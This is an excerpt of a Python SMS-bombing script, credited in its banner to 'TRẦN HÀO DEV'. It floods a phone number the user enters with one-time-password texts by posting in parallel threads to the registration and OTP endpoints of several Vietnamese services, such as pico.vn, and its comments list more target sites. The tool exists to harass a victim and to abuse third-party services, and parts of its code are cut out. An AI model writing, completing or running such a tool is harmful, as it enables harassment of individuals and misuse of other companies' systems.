...
def spam_otp(sdt):
    ...
    def logo():
        print("")
        print('   ___  ___   ___   _  _____ ___  __  _  __     ')
        print("  / o |/ o | / _/ .' \/_  _// _/ /  \| |/,'     ")
        print(" / _,'/  ,' / _/ / o / / / / _/ / o || ,'      ")
        print("/_/  /_/`_\/___//_n_/ /_/ /___//__,'/_/       ")

        print('\n Tool spam sms by TRẦN HÀO DEV')
        print('Liên hệ Telegram @Haomilknn nếu xảy ra lỗi')
        print('---------------------------------------------------------')
    logo()
    ...
    def get_location_by_ip():
        try:
            ...
            #print("")  # In thông báo nếu thành công
    ...
    def send_otp_via_ACHECKIN(sdt):
        ...
        if response1.status_code == 200:
            print(f" ☑ SPAM SMS {phone} => Thành Công")
    ...
    def send_otp_via_pico(sdt):
        ...
        response1 = requests.post('https://auth.pico.vn/user/api/auth/register', headers=headers1, json=json_data1)
        ...
        response2 = requests.post('https://auth.pico.vn/user/api/auth/login/request-otp', headers=headers2, json=json_data2)
    ...
    otp_functions = [
        ...
        send_otp_via_vayvnd, send_otp_via_tima,
    ...
    for i, func in enumerate(otp_functions):
        thread = threading.Thread(target=send_otp_with_delay, args=(func, phone, i * delay if delay > 0 else 0))
...
while True:
        ...
        phone = input("Nhập SDT cần spam: ").strip()
...
# moca.vn
# pantio.vn
# https://routine.vn/ khóa rồi
# https://vayvnd.vn/
# https://moneygo.vn/ khóa rồi
# https://pico.vn
